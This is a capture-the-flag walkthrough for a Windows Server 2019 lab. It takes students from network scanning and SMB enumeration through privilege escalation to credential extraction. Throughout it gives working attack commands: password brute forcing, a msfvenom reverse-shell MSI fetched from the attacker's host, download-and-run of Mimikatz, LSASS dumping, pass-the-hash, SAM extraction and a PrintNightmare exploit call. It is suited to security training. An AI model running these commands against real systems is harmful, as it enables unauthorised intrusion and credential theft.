# Windows Server 2019 CTF - Student Walkthrough Guide
**A Realistic Penetration Testing Approach**

> **Note**: This walkthrough approaches the target as a real penetration test, discovering vulnerabilities naturally without prior knowledge of what we're looking for. Flags are obfuscated to preserve the challenge while confirming you're on the right track.

## Initial Setup - Preparing Your Attack Platform

```bash
# Update your Kali Linux
sudo apt update && sudo apt upgrade -y

# Install essential tools we'll need
sudo apt install -y nmap masscan enum4linux smbclient smbmap crackmapexec \
    metasploit-framework impacket-scripts hydra medusa john hashcat \
    gobuster dirb nikto wfuzz sqlmap bloodhound neo4j evil-winrm \
    powershell-empire starkiller responder mitm6 proxychains4 \
    chisel ligolo-ng python3-pip git curl wget netcat-traditional

# Install additional Python tools
pip3 install kerbrute ldap3 pycryptodome colorama

# Clone useful repositories
cd /opt
sudo git clone https://github.com/SecureAuthCorp/impacket.git
sudo git clone https://github.com/PowerShellMafia/PowerSploit.git
sudo git clone https://github.com/carlospolop/PEASS-ng.git

# Set up environment variables (adjust IPs as needed)
export TARGET=192.168.148.101    # Windows Server 2019
export LHOST=192.168.148.99      # Your Kali IP
```

## Phase 1: Network Discovery and Initial Reconnaissance

### Step 1.1: Network Scanning

Let's start by discovering what's on the network:

```bash
# Quick ping sweep to find live hosts
nmap -sn 192.168.148.0/24 -oA network_discovery

# Once we identify the server, let's do a comprehensive scan
nmap -sC -sV -O -A -p- -T4 $TARGET -oA full_tcp_scan

# While that's running (it takes time), let's do a quick scan of common ports
nmap -sC -sV -p 21,22,23,25,53,80,88,110,111,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,5985,5986,8080,8443 $TARGET -oA quick_scan
```

**Alternative Tools:**
```bash
# Masscan for speed
sudo masscan -p1-65535 $TARGET --rate=1000 -e eth0

# Unicornscan for accuracy
sudo unicornscan -mT -I $TARGET:1-65535

# RustScan for modern speed
rustscan -a $TARGET -- -sC -sV
```

Expected services we'll likely find:
- 22/tcp - SSH
- 80/tcp - HTTP
- 135/tcp - RPC
- 139/tcp - NetBIOS
- 445/tcp - SMB
- 3389/tcp - RDP
- 5985/tcp - WinRM

### Step 1.2: Service Version Detection

```bash
# Aggressive service detection
nmap --script=banner,ssl-cert,ssh-hostkey,smb-os-discovery,http-headers $TARGET

# Grab banners manually
nc -nv $TARGET 22
echo "" | nc -nv $TARGET 80
```

## Phase 2: Service Enumeration and Initial Access

### Step 2.1: SMB Enumeration (Port 139/445)

SMB is often the most fruitful for Windows targets:

```bash
# Null session enumeration
enum4linux -a $TARGET | tee enum4linux_output.txt

# Check for anonymous access
smbclient -L //$TARGET -N

# Map shares
smbmap -H $TARGET
smbmap -H $TARGET -u null -p null
smbmap -H $TARGET -u guest -p ''

# CrackMapExec for comprehensive enumeration
crackmapexec smb $TARGET -u '' -p '' --shares
crackmapexec smb $TARGET -u 'guest' -p '' --shares
crackmapexec smb $TARGET -u '' -p '' --users
crackmapexec smb $TARGET -u '' -p '' --pass-pol
```

**Alternative SMB Tools:**
```bash
# nbtscan for NetBIOS info
nbtscan $TARGET

# rpcclient for RPC enumeration
rpcclient -U "" -N $TARGET
# Once connected:
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser 500
rpcclient $> getdompwinfo

# nmap SMB scripts
nmap --script=smb-enum-*,smb-vuln-* -p 139,445 $TARGET
```

When enumerating users, pay attention to descriptions and comments - administrators sometimes leave notes there:

```bash
# In rpcclient, query each user
rpcclient $> queryuser 0x1f4
rpcclient $> queryuser 0x1f5
# Look for: User Name, Full Name, Description, Comment fields
```

**FLAG{P***************4}** - Found in admin user description field

### Step 2.2: Advanced User Enumeration

Sometimes users themselves can be interesting:

```bash
# Enumerate all users including potentially hidden ones
net rpc user -I $TARGET -U ""

# Using lookupsid.py from Impacket
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py guest@$TARGET

# Kerbrute for domain users (if domain is present)
kerbrute userenum --dc $TARGET -d DOMAIN.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Look for unusual usernames - sometimes they're not standard names:
**FLAG{M***8}** - Found as an actual username

### Step 2.3: Accessing SMB Shares

Let's explore accessible shares:

```bash
# Connect to each share
smbclient //$TARGET/Public -N
smb: \> ls -la
smb: \> recurse on
smb: \> prompt off
smb: \> mget *

# Check each share systematically
for share in $(smbmap -H $TARGET | grep READ | awk '{print $1}'); do
    echo "=== Checking $share ==="
    smbclient //$TARGET/$share -N -c "ls"
done
```

**Alternative Methods:**
```bash
# Mount shares locally
mkdir /mnt/smb_shares
mount -t cifs //$TARGET/Public /mnt/smb_shares -o username=guest,password=''

# Use smbget for recursive download
smbget -R smb://$TARGET/Public -U guest%
```

Files to look for:
- `*.txt` files often contain notes
- `passwords.*` files
- Configuration files
- Backup files

**FLAG{D***************5}** - Found in Public share
**FLAG{S***************9}** - Found in Backup share  
**FLAG{A***************7}** - Found in IT share (may need credentials)

### Step 2.4: File Content Analysis

When you find text files, examine them thoroughly:

```bash
# Search through all downloaded files
grep -r "password\|passwd\|pwd\|user\|admin" ./smb_loot/
grep -r "[A-Z]{4,}" ./smb_loot/  # Look for uppercase patterns
strings -n 10 ./smb_loot/* | less  # Find readable strings

# Check for hidden content
for file in ./smb_loot/*; do
    echo "=== $file ==="
    cat "$file"
    # Check for alternate data streams (if on Windows)
    # Check file properties and metadata
    exiftool "$file"
done
```

**FLAG{M***************2}** - Found embedded in passwords.txt

### Step 2.5: Alternate Data Streams (ADS)

Windows NTFS supports hidden data streams:

```powershell
# If you gain Windows access
Get-Item C:\Public\* -Stream * | Select-Object FileName, Stream
Get-Content C:\Public\normal.txt -Stream *

# Or via SMB
smbclient //$TARGET/Public -c "allinfo normal.txt"
```

**Alternative ADS Detection:**
```bash
# Using smbclient
smbclient //$TARGET/Public -N
smb: \> allinfo normal.txt
# Look for alternate streams listed

# Using Windows tools remotely (if you have creds)
wmic /node:$TARGET /user:username /password:password datafile where name="C:\\Public\\normal.txt" get /format:list
```

**FLAG{L***************4}** - Found in ADS of normal.txt

## Phase 3: Service Exploitation and Credential Harvesting

### Step 3.1: SSH Service (Port 22)

```bash
# Check SSH banner
nc -nv $TARGET 22
ssh -v $TARGET 2>&1 | grep -i "debug\|banner"

# Check SSH configuration
ssh $TARGET -o PreferredAuthentications=none 2>&1
```

The SSH banner often contains information:
**FLAG{Z***************1}** - Found in SSH banner

Once you have credentials, check SSH configurations:
```bash
ssh username@$TARGET
cat /etc/ssh/sshd_config | grep -i banner
cat /etc/ssh/banner.txt
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
```

**FLAG{M***************7}** - Found in authorized_keys comments

### Step 3.2: Web Enumeration (Port 80)

```bash
# Initial web reconnaissance
curl -I http://$TARGET
curl http://$TARGET/robots.txt
curl http://$TARGET/sitemap.xml

# Directory enumeration
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,html,txt -t 50

# Alternative with dirb
dirb http://$TARGET /usr/share/wordlists/dirb/common.txt

# Detailed scanning with nikto
nikto -h http://$TARGET
```

**Alternative Web Tools:**
```bash
# Wfuzz for fuzzing
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://$TARGET/FUZZ

# Feroxbuster (modern and fast)
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Check for specific files
for file in web.config .htaccess .git .svn .DS_Store Thumbs.db; do
    curl -s http://$TARGET/$file
done
```

When examining web pages, always check:
```bash
# View source for comments
curl -s http://$TARGET/vulnapp/login.html | grep -i "<!--"
curl -s http://$TARGET/ | grep -i "todo\|fixme\|hack\|debug\|password"

# Check JavaScript files
curl -s http://$TARGET/js/main.js | js-beautify
```

**FLAG{A***************3}** - Found in HTML comment

### Step 3.3: Password Attacks

Based on enumerated users, let's try common passwords:

```bash
# Create user list from enumeration
echo -e "Administrator\nadmin\noverlock\nbackup\nservice\ntest\nsqlservice\nsvc_print\ndebugger" > users.txt

# Common passwords
echo -e "Password123!\nPassword1\nAdmin123\nWelcome1\npassword\nadmin\nPassword1234" > passwords.txt

# RDP brute force
hydra -L users.txt -P passwords.txt rdp://$TARGET -t 4

# SMB brute force
crackmapexec smb $TARGET -u users.txt -p passwords.txt

# WinRM brute force
crackmapexec winrm $TARGET -u users.txt -p passwords.txt
```

**Alternative Password Attack Tools:**
```bash
# Medusa for multi-protocol
medusa -h $TARGET -U users.txt -P passwords.txt -M smbnt

# Metasploit auxiliary modules
msfconsole -q
use auxiliary/scanner/smb/smb_login
set RHOSTS $TARGET
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

Expected credentials to find:
- overclock:Administrator2025!
- Administrator:Password123!

## Phase 4: Windows Privilege Escalation

### Step 4.1: Initial Windows Access

Once we have credentials:

```bash
# RDP access
xfreerdp /v:$TARGET /u:overclock /p:Administrator2025! /cert:ignore +clipboard /dynamic-resolution

# Evil-WinRM for command line
evil-winrm -i $TARGET -u overclock -p Administrator2025!

# PSExec
impacket-psexec overclock:Administrator2025!@$TARGET
```

### Step 4.2: Windows Enumeration

```powershell
# System information
systeminfo
hostname
whoami /all
net users
net localgroup administrators

# Check for interesting files
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config,*.log -Recurse -ErrorAction SilentlyContinue

# Check services
Get-Service | Format-Table Name, Status, StartType, DisplayName
Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, State
```

### Step 4.3: Unquoted Service Paths

This is a common Windows vulnerability:

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Or in PowerShell
Get-WmiObject win32_service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -notmatch 'C:\\Windows'} | Select-Object Name, PathName

# Check each service
sc qc VulnScanner
sc qc CommonAppService
sc qc VendorUpdater
```

To exploit:
```powershell
# If path is: C:\Program Files\Vulnerable Scanner\bin\scanner.exe
# We can place a file at:
# C:\Program.exe
# C:\Program Files\Vulnerable.exe

# Create a simple executable that runs and shows output
echo 'cmd /c "whoami > C:\temp\service_exploited.txt"' > C:\Program.bat

# Restart the service
sc stop VulnScanner
sc start VulnScanner

# Check if it worked
type C:\temp\service_exploited.txt
```

**FLAG{E***************0}** - From VulnScanner service
**FLAG{V***************8}** - From CommonAppService
**FLAG{J***************0}** - From VendorUpdater

### Step 4.4: AlwaysInstallElevated

Check if MSI installations run with elevated privileges:

```powershell
# Check registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are set to 1, we can escalate
```

Exploitation:
```bash
# From Kali, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o exploit.msi

# Start listener
nc -nlvp 4444

# Upload and execute MSI on target
certutil -urlcache -f http://$LHOST/exploit.msi exploit.msi
msiexec /quiet /qn /i exploit.msi
```

Once you have SYSTEM access, explore:
```powershell
whoami
cd C:\Windows\System32\config\systemprofile
dir /a
type msi_flag.txt
```

**FLAG{F***************3}** - Accessible after MSI escalation

### Step 4.5: Registry Enumeration

The registry often contains interesting information:

```powershell
# Check for custom applications
reg query HKLM\SOFTWARE /s /f password
reg query HKLM\SOFTWARE /s /f license
reg query HKLM\SOFTWARE\VulnApp

# Check Run keys for persistence
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Service registry entries
reg query HKLM\System\CurrentControlSet\Services\VulnScanner
```

**FLAG{P***************0}** - In HKLM\SOFTWARE\VulnApp
**FLAG{A***************1}** - In HKCU Run key
**FLAG{P***************9}** - In service registry

### Step 4.6: Scheduled Tasks

```powershell
# List all scheduled tasks
schtasks /query /fo LIST /v | more

# PowerShell method
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}

# Check for interesting tasks
schtasks /query /tn VulnTask /fo LIST /v
```

Tasks with stored credentials are particularly interesting:
```powershell
# Run the task
schtasks /run /tn VulnTask

# Check where it outputs
dir C:\Public\
type C:\Public\taskflag.txt
```

**FLAG{M***************4}** - From scheduled task output

### Step 4.7: Service Enumeration

```powershell
# List all services with descriptions
sc query state=all | findstr "SERVICE_NAME"
Get-Service | Select-Object Name, DisplayName, Status, StartType

# Check specific service
sc qdescription WeakPermService
```

**FLAG{D***************2}** - In service description

## Phase 5: Advanced Credential Extraction

### Step 5.1: Mimikatz Deployment

Now for the advanced credential extraction:

```powershell
# Download Mimikatz
Invoke-WebRequest -Uri "http://$LHOST/mimikatz.exe" -OutFile "C:\temp\m.exe"

# Or use PowerShell version
IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-Mimikatz.ps1')
```

### Step 5.2: LSASS Memory Dumping

```powershell
# Run Mimikatz
C:\temp\m.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::tickets
```

In the output, look for unusual entries beyond just passwords:
**FLAG{B***************5}** - Found in LSASS memory dump

**Alternative LSASS Dumping:**
```powershell
# Using ProcDump (legitimate tool)
procdump -accepteula -ma lsass.exe lsass.dmp

# Using comsvcs.dll (living off the land)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\temp\lsass.dmp full

# Transfer dump for offline analysis
# On Kali: pypykatz lsa minidump lsass.dmp
```

### Step 5.3: Debug Privileges

```powershell
# Check who has debug privileges
whoami /priv
Get-LocalGroupMember -Group "Debuggers"

# If debugger user exists
runas /user:debugger cmd.exe
# Password: Debugger2025!

# With debug privileges, access protected areas
reg query HKLM\SOFTWARE\DebugFlags
```

**FLAG{S***************9}** - In DebugFlags registry

### Step 5.4: Pass-the-Hash

With NTLM hashes from Mimikatz:

```bash
# From Kali, use the hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c Administrator@$TARGET

# Or with CrackMapExec
crackmapexec smb $TARGET -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --exec-method smbexec -x "type C:\Windows\System32\config\systemprofile\pth_success.txt"
```

**FLAG{M***************9}** - Accessible after PTH

### Step 5.5: SAM Database

```powershell
# If you find SAM backups
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SECURITY security.hiv

# Transfer to Kali and extract
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL

# Or if you find backup files in shares
# Check C:\Backup\sam_backup_info.txt
```

**FLAG{G***************5}** - Related to SAM backup

### Step 5.6: RDP Certificate Properties

```powershell
# Check RDP certificate properties
reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /s
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server"
```

**FLAG{G***************6}** - In CertificateComment property

## Phase 6: Print Spooler Exploitation

### Step 6.1: PrintNightmare Check

```powershell
# Check if Print Spooler is running
Get-Service Spooler

# Check for vulnerability
ls C:\Windows\System32\spool\drivers\
icacls C:\Windows\System32\spool\drivers\color

# If writable by users, it's vulnerable
Get-Acl C:\Windows\System32\spool\drivers\color | fl
```

Explore the directory:
```powershell
dir C:\Windows\System32\spool\drivers\color\
type C:\Windows\System32\spool\drivers\color\*.txt
```

**FLAG{A***************2}** - In printnightmare_flag.txt

**Alternative PrintNightmare Exploitation:**
```python
# Using CVE-2021-34527 exploit
python3 CVE-2021-34527.py Domain.local/username:password@$TARGET '\\attacker\share\payload.dll'

# Or using Metasploit
use exploit/windows/dcerpc/ms_printer_spoolss
```

## Phase 7: Advanced Persistence and Hidden Data

### Step 7.1: WMI Persistence

```powershell
# Check for WMI persistence
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding

# Check WMI repository
wmic process list brief
wmic startup list brief
```

### Step 7.2: Hidden Streams and Files

```powershell
# Find all alternate data streams
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
    Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue
} | Where-Object {$_.Stream -ne ':$DATA'}

# Check specific locations
dir /r C:\Public
dir /r C:\Users\Public
```

## Comprehensive Tool Alternatives

### Network Scanning Alternatives:
- **Nmap**: Industry standard, extensive scripts
- **Masscan**: Fastest port scanner
- **Zmap**: Internet-wide scanning capability
- **Unicornscan**: Accurate asynchronous scanning
- **RustScan**: Modern, fast, integrates with Nmap

### SMB Enumeration Alternatives:
- **enum4linux**: Comprehensive SMB enumeration
- **smbmap**: Visual share mapping
- **smbclient**: Direct share access
- **CrackMapExec**: Swiss army knife for SMB
- **rpcclient**: RPC enumeration
- **nbtscan**: NetBIOS information

### Web Enumeration Alternatives:
- **Gobuster**: Fast directory brute-forcing
- **Dirb**: Classic directory scanner
- **Dirsearch**: Python-based scanner
- **Feroxbuster**: Modern Rust-based scanner
- **Wfuzz**: Flexible fuzzing tool
- **ffuf**: Fast web fuzzer

### Password Attack Alternatives:
- **Hydra**: Multi-protocol brute force
- **Medusa**: Parallel password cracker
- **CrackMapExec**: SMB/WinRM focused
- **Metasploit**: Auxiliary modules
- **Patator**: Flexible brute-forcer
- **THC-Hydra**: Enhanced Hydra version

### Privilege Escalation Alternatives:
- **WinPEAS**: Automated enumeration
- **PowerUp**: PowerShell privesc
- **SharpUp**: C# privilege escalation
- **Watson**: Missing patches detection
- **Seatbelt**: Security enumeration
- **JAWS**: Just Another Windows Enum Script

### Credential Extraction Alternatives:
- **Mimikatz**: Gold standard for Windows credentials
- **LaZagne**: Multi-application password recovery
- **SharpDump**: Minidump of LSASS
- **ProcDump**: Microsoft's official tool
- **Pypykatz**: Python Mimikatz implementation
- **SharpChrome**: Chrome password extraction

## Final Notes for Success

1. **Enumeration is key**: Spend 80% of your time on enumeration
2. **Document everything**: Keep detailed notes of what works
3. **Try multiple tools**: Different tools reveal different information
4. **Think like an admin**: Where would you hide sensitive information?
5. **Check everything**: Comments, descriptions, metadata, properties
6. **Persistence pays**: If something doesn't work, try a different approach
7. **Understand the vulnerability**: Don't just run exploits, understand why they work

Remember: In a real penetration test, you would document each finding with:
- Screenshot evidence
- Exact commands used
- Risk rating
- Remediation recommendations

This walkthrough simulates a realistic penetration test where discoveries are made naturally through methodical enumeration and exploitation.